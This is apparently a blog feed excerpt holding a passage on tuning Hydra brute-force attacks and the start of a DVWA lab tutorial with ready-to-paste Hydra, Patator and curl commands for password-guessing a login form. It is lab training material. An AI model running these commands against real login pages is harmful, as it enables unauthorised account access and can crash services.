&lt;li&gt;Network speed (both up and down stream)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How many other people are using the target machine?

&lt;ul&gt;
&lt;li&gt;Port exhaustion?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What is the web application?

&lt;ul&gt;
&lt;li&gt;How many requests does it make to a database?&lt;/li&gt;
&lt;li&gt;What functions does it perform on the page load (e.g. calculating what type of password hashes? Certain ones can be more demanding, therefore increases work load).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;...and this is all before any brute force protection is in place (firewalls etc)!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As stated in the troubleshooting rambles section, I killed my target VM multiple times doing this&lt;/strong&gt;, just by having the numbers "too high". The web server stopped working (aka DoS). Even though the CPU &amp;amp; RAM were not maxed out and the web server port was still open, Apache was still running. However, trying to access the web application had &lt;strong&gt;just stop working&lt;/strong&gt;. Point being, even if on the surface it appears everything is up and running - it might not be the case.&lt;/p&gt;

&lt;p&gt;The whole attack runs at the speed of the slowest point in the system.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This is one reason why there is not a "magic silver bullet" answer. Getting it right and the maximum performance, first time is rare =)&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Web Service Response&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Certain setups will behave differently if you push the attack over the line. Also the whole setup itself which is being pushed may have an effect.&lt;/p&gt;

&lt;p&gt;For example, the server results for our target (Windows XP &amp;amp; Apache), depending on the amount of threads:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;1 thread - Windows XP &amp;amp; Apache would work normally&lt;/li&gt;
&lt;li&gt;2-15 threads, - if you were to try and access the web server, it would "forever load" (giving you just a white page and a progress bar).&lt;/li&gt;
&lt;li&gt;64 threads - increasing the threads to the maximum Hydra allows and straight away when trying to access any page on the remote server, the browser will report says "The page cannot be displayed".&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Doing too much, may DoS the service. Due to how Hydra works &lt;strong&gt;it will not inform you if the service is still up and responding correctly&lt;/strong&gt; (unless you enable verbose and watch for "timeouts"). By default Hydra will not report if the web service is responding "normally".&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Low timeouts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Throughout this blog post, the timeout has been &lt;strong&gt;1 second&lt;/strong&gt;. Having it this low is not always smart. Hydra even displays a warning banner &lt;code&gt;[WARNING] the waittime you set is low, this can result in erroneous results&lt;/code&gt;. It was set to be this low, because of the network connection (being local), as well as the lower thread count. It would not have done too much harm having it higher because normally it would not have reached the timeout value. You need to find the balance of threads vs wait time. Having one too high and the other too low will slow down the attack. What the value should be depends on various values that have been mentioned above.&lt;/p&gt;

&lt;p&gt;If you increase the thread count too much, and the timeout value is not enough, there is a good chance valid requests will be dropped including when there was a successful login. This can be seen in the benchmark results. Towards when there were 16/32 threads it would have benefited from a higher timeout and cases when the password was not found.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;On one hand, you do you want to be waiting 20 seconds for a thread that is "stuck" each time, on the other hand, having more threads will take the target longer to respond so the timeout value needs to be able to catch valid responses&lt;/strong&gt;. In a perfect attack, the thread would not become stuck but there are lots of reasons why this could happen. &lt;strong&gt;It is a case of trial &amp;amp; error and a lot of waiting&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Speed&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Looking at our Hydra command with &lt;code&gt;-e -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt -e ns&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Total requests == (&lt;code&gt;Number of user names&lt;/code&gt; * &lt;code&gt;number of passwords&lt;/code&gt;) + (&lt;code&gt;Number of usernames, due to empty passwords&lt;/code&gt;) + (&lt;code&gt;Number of usernames, due to username as password&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Total requests == (&lt;code&gt;11&lt;/code&gt; * &lt;code&gt;500&lt;/code&gt;) + &lt;code&gt;11&lt;/code&gt; + &lt;code&gt;11&lt;/code&gt; = &lt;code&gt;5,522&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;So if the maximum number is 5,522 and a single thread, which has a timeout of 10 seconds, it would take a maximum of &lt;code&gt;5,522 requests&lt;/code&gt; * &lt;code&gt;10 seconds&lt;/code&gt; = &lt;code&gt;15.3 hours&lt;/code&gt; to run through the complete list (&lt;strong&gt;if&lt;/strong&gt; each of the threads reached the maximum timeout value). Now, the timeout value may never reach 10 seconds, but we need to allow for it. Also, there is a 50% chance it will be in the first half... Still, this is why &lt;strong&gt;brute forcing is slow&lt;/strong&gt;, and why people want to increase the thread count...&lt;/p&gt;

&lt;p&gt;Adding a wait in between each attempt of 1 second (&lt;code&gt;-W 1&lt;/code&gt;), increases it to 16.8 hours (an extra 90 minutes), however, we are being "kinder" to the web server, so hopefully it will not crash (thus wasting everything). If the target does crash (or block), Hydra will not be aware of this and just keep on trying (so you could be waiting for nothing)...&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Conclusion"&gt;&lt;/a&gt;
&lt;h3&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;There was a very slight different between setups (Windows vs Linux as well as Apache vs IIS vs Nginx). For the most part, the main brute force command was identical (only thing that required altering was the thread count).&lt;/p&gt;

&lt;p&gt;The two main command line tools are either Hydra or Patator to-do the brute force, but they have their own limitations (covered more in this post). This was a straight forward HTTP web form brute force attack (the incorrect CSRF token system made it slightly harder and the redirect function often tricks people up).
A straight forward brute force&lt;/p&gt;</description><pubDate>Mon, 26 Oct 2015 16:00:00 +0000</pubDate></item><item><title>DVWA Brute Force (Low Level) - HTTP GET Form [Hydra, Patator, Burp]</title><link>https://blog.g0tmi1k.com/dvwa/bruteforce-low/</link><description>&lt;p&gt;This post is a "how to" for the &lt;strong&gt;"brute force" module&lt;/strong&gt; set to &lt;strong&gt;"low" level security&lt;/strong&gt; inside of &lt;strong&gt;&lt;a href="http://dvwa.co.uk/"&gt;Damn Vulnerable Web Application (DVWA)&lt;/a&gt;&lt;/strong&gt;. There are separate posts for the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;medium level (time delay)&lt;/a&gt; and &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/"&gt;high setting (CSRF tokens)&lt;/a&gt;. There is a related post for the &lt;a href="https://blog.g0tmi1k.com/dvwa/login/"&gt;login screen&lt;/a&gt; as it was also brute forced (HTTP POST form with CSRF tokens).&lt;/p&gt;

&lt;p&gt;&lt;img alt="Brute Force DVWA Low Level" class="center" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-low.png" title="Brute Force DVWA Low Level" /&gt;&lt;/p&gt;

&lt;p&gt;Once more, let's &lt;strong&gt;forget the credentials&lt;/strong&gt; we used to login to DVWA with (&lt;code&gt;admin&lt;/code&gt;:&lt;code&gt;password&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Let's &lt;strong&gt;not try the default login&lt;/strong&gt; for the web application.&lt;/p&gt;

&lt;p&gt;Let's &lt;strong&gt;play dumb and brute force&lt;/strong&gt; DVWA... &lt;em&gt;again&lt;/em&gt;.&lt;/p&gt;

&lt;!--more--&gt;


&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: Quick copy/paste&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;curl -s -c dvwa.cookie &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;'value='&lt;/span&gt; &lt;span class="s1"&gt;'/user_token/ {print $2}'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s2"&gt;&amp;quot;'&amp;quot;&lt;/span&gt; -f2&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;grep PHPSESSID dvwa.cookie &lt;span class="p"&gt;|&lt;/span&gt; awk -F &lt;span class="s1"&gt;' '&lt;/span&gt; &lt;span class="s1"&gt;'{print $7}'&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;curl -s -b dvwa.cookie -d &lt;span class="s2"&gt;&amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -e ns  -F  -u  -t &lt;span class="m"&gt;1&lt;/span&gt;  -w &lt;span class="m"&gt;10&lt;/span&gt;  -v  -V  192.168.1.44  http-get-form &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="s2"&gt;&amp;quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;patator  http_fuzz  &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;GET  &lt;span class="nv"&gt;follow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="nv"&gt;accept_cookie&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;  --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="nv"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;url&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=FILE1&amp;amp;password=FILE0&amp;amp;Login=Login&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Usernames/top_shortlist.txt  &lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/share/seclists/Passwords/rockyou-40.txt &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="nv"&gt;header&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cookie: security=low; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -x quit:fgrep&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'Welcome to the password protected area'&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;hr /&gt;

&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Objectives"&gt;Objectives&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Setup"&gt;Setup&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Tools"&gt;Tools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#What.is.brute.force."&gt;What is brute force?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Creating.a.Session.Cookie"&gt;Creating a Session Cookie&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Information.Gathering"&gt;Information Gathering&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Form.HTML.Code"&gt;Form HTML Code&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Generating.a.Baseline"&gt;Generating a Baseline&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Test.lab.vs.Production.target"&gt;Test lab vs Production target&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Blacklisting.vs.Whitelisting"&gt;Blacklisting vs Whitelisting&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Usernames..amp..Wordlists"&gt;Usernames &amp;amp; Wordlists&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Threads..amp..Timeouts"&gt;Threads &amp;amp; Timeouts&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Hydra..strong."&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Hydra.Documentation"&gt;Hydra Documentation&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Debugging.Hydra.with.Burp.Proxy"&gt;Debugging Hydra with Burp Proxy&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Burp.s.Invisible.Proxy.Mode"&gt;Burp's Invisible Proxy Mode&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Hydra.Attack.Command..strong."&gt;&lt;strong&gt;Hydra Attack Command&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Patator..strong."&gt;&lt;strong&gt;Patator&lt;/strong&gt;&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Patator.Documentation"&gt;Patator Documentation&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Debugging.Patator"&gt;Debugging Patator&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Patator.Attack.Command..strong."&gt;&lt;strong&gt;Patator Attack Command&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#L.strong.Burp.Proxy..strong."&gt;&lt;strong&gt;Burp Proxy&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Failed.Attempts"&gt;Failed Attempts&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Medusa"&gt;Medusa&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Nmap"&gt;Nmap&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Ncrack"&gt;Ncrack&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Metasploit.Framework"&gt;Metasploit Framework&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Proof.of.Concept.Scripts"&gt;Proof of Concept Scripts&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Bash.Template"&gt;Bash Template&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Python.Template"&gt;Python Template&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Summary"&gt;Summary&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Hydra.vs.Patator.Syntax"&gt;Hydra vs Patator Syntax&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Benchmark"&gt;Benchmark&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Conclusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Objectives"&gt;&lt;/a&gt;
&lt;h2&gt;Objectives&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;The goal is to &lt;strong&gt;brute force an HTTP login&lt;/strong&gt; page.

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GET requests&lt;/strong&gt; are made via a &lt;strong&gt;form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;The web page is in a &lt;strong&gt;sub folder&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;Low&lt;/a&gt;&lt;/strong&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Straight forward HTTP GET&lt;/strong&gt; brute force attack via a &lt;strong&gt;web form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Bonus: &lt;strong&gt;SQL injection&lt;/strong&gt; (&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#*comingsoon*"&gt;See here for more information&lt;/a&gt;&lt;/del&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;Medium&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Extends on the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level&lt;/a&gt; - HTTP GET attack via a web form.&lt;/li&gt;
&lt;li&gt;Adds in a &lt;strong&gt;static time delay&lt;/strong&gt; (3 seconds) on failed logins.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/"&gt;High&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Extends on the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level&lt;/a&gt; - HTTP GET attack via a web form.&lt;/li&gt;
&lt;li&gt;This time uses a &lt;strong&gt;random time delay&lt;/strong&gt; (between 0 and 4 seconds) instead.&lt;/li&gt;
&lt;li&gt;Uses an &lt;strong&gt;anti Cross-Site Request Forgery (CSRF) token&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#comingsoon"&gt;Impossible&lt;/a&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;Submits data via HTTP &lt;strong&gt;POST&lt;/strong&gt; via web form&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Accounts will lock out&lt;/strong&gt; after 5 failed logins.

&lt;ul&gt;
&lt;li&gt;Time delay before becoming unlocked (15 minutes).&lt;/li&gt;
&lt;li&gt;Unable to enumerate users on the system.&lt;/li&gt;
&lt;li&gt;Possible &lt;strong&gt;"Denial of Service (DoS)" vector&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#comingsoon"&gt;PHPIDS&lt;/a&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;Does not protect against this attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;All attack methods are still the same!&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Setup"&gt;&lt;/a&gt;
&lt;h2&gt;Setup&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Main target: &lt;a href="https://github.com/RandomStorm/DVWA/releases"&gt;DVWA v1.10&lt;/a&gt; (Running on &lt;code&gt;Windows Server 2012 Standard ENG x64&lt;/code&gt; + &lt;code&gt;IIS 8&lt;/code&gt;).

&lt;ul&gt;
&lt;li&gt;Target setup &lt;strong&gt;does not matter too much&lt;/strong&gt; for this - &lt;code&gt;Debian&lt;/code&gt;/&lt;code&gt;Arch Linux&lt;/code&gt;/&lt;code&gt;Windows&lt;/code&gt;, &lt;code&gt;Apache&lt;/code&gt;/&lt;code&gt;Nginx&lt;/code&gt;/&lt;code&gt;IIS&lt;/code&gt;, &lt;code&gt;PHP v5.x&lt;/code&gt;, or &lt;code&gt;MySQL&lt;/code&gt;/&lt;code&gt;MariaDB&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The main target is on the IP (&lt;code&gt;192.168.1.44&lt;/code&gt;), port (&lt;code&gt;80&lt;/code&gt;) and subfolder (&lt;code&gt;/DVWA/&lt;/code&gt;), which is known ahead of time.&lt;/li&gt;
&lt;li&gt;Because the target is Windows, it does not matter about case sensitive URL requests (&lt;code&gt;/DVWA/&lt;/code&gt; vs &lt;code&gt;/dvwa/&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacker: &lt;a href="https://www.kali.org/"&gt;Kali Linux v2&lt;/a&gt; (+ &lt;a href="https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh"&gt;Personal Custom Post-install Script&lt;/a&gt;).

&lt;ul&gt;
&lt;li&gt;Shell prompt will look different (due to &lt;a href="http://www.zsh.org/"&gt;ZSH&lt;/a&gt;/&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;Oh-My-ZSH&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Added colour to tools output (thanks to &lt;a href="https://github.com/garabik/grc"&gt;GRC&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Both machines are running inside a Virtual Machine (VMware ESXi).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;cURL - Information gathering (used for viewing source code &amp;amp; to automate generating sessions).

&lt;ul&gt;
&lt;li&gt;Could also use wget (&lt;code&gt;wget -qO -&lt;/code&gt;) instead.&lt;/li&gt;
&lt;li&gt;Or using Burp/Iceweasel, however, it is harder to automate them due to them being graphical, which makes doing repetitive stuff boring.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.thc.org/thc-hydra/"&gt;THC-Hydra v8.1&lt;/a&gt; - A brute force tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lanjelot/patator"&gt;Patator v0.5&lt;/a&gt; - An alternative brute force tool.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://portswigger.net/burp/proxy.html"&gt;Burp Proxy v16.0.1&lt;/a&gt; - Debugging requests &amp;amp; brute force tool

&lt;ul&gt;
&lt;li&gt;Using &lt;a href="https://getfoxyproxy.org/"&gt;FoxyProxy&lt;/a&gt; to switch proxy profiles in Iceweasel.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/danielmiessler/SecLists"&gt;SecLists&lt;/a&gt; - General wordlists.

&lt;ul&gt;
&lt;li&gt;These are common, default and small wordlists.&lt;/li&gt;
&lt;li&gt;Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with &lt;a href="https://digi.ninja/projects/cewl.php"&gt;CeWL&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Failed brute force tools:

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://foofus.net/goons/jmk/medusa/medusa.html"&gt;Medusa v2.1.1&lt;/a&gt; - segmentation faults when sending a custom header and HTTP 200 response.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.metasploit.com/"&gt;Metasploit v4.11.4-2015090201&lt;/a&gt; - &lt;code&gt;auxiliary/scanner/http/http_login&lt;/code&gt; does HTTP basic authentication, not web forms.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nmap.org/ncrack/"&gt;Ncrack v0.4 ALPHA&lt;/a&gt; - HTTP module only supports HTTP basic access authentication, not web forms.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nmap.org/"&gt;Nmap v6.49 BETA5&lt;/a&gt; - &lt;code&gt;http-form-brute&lt;/code&gt; lacks required options to-do the attack (as it cannot send custom headers).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="What.is.brute.force."&gt;&lt;/a&gt;
&lt;h2&gt;What is brute force?&lt;/h2&gt;

&lt;p&gt;For the people who are unaware of "brute force attacks", here is an overview of the most common points:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Brute forcing is a &lt;strong&gt;trial and error method of repeatedly trying out a task&lt;/strong&gt;, sequentially changing a value each time, until a certain result is achieved.

&lt;ul&gt;
&lt;li&gt;So it forces its way in, and does not take "no" for an answer.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The values used in the attack may be &lt;strong&gt;predefined in a file&lt;/strong&gt; (often called a wordlist or dictionary file - there is not a difference between terms), where only these certain values are used. Alternatively, &lt;strong&gt;every possible combination could be used in a given range&lt;/strong&gt;. Example:

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Brute force attack&lt;/strong&gt;: &lt;code&gt;AAA&lt;/code&gt; -&gt; &lt;code&gt;AAB&lt;/code&gt; -&gt; &lt;code&gt;AAC&lt;/code&gt; -&gt; ... -&gt; &lt;code&gt;ZZY&lt;/code&gt; -&gt; &lt;code&gt;ZZZ&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Dictionary attack:&lt;/strong&gt; &lt;code&gt;ANT&lt;/code&gt; -&gt;  &lt;code&gt;BED&lt;/code&gt; -&gt; &lt;code&gt;CCC&lt;/code&gt; -&gt; &lt;code&gt;DOG&lt;/code&gt; -&gt; &lt;code&gt;EEE&lt;/code&gt; -&gt; &lt;code&gt;HOG&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
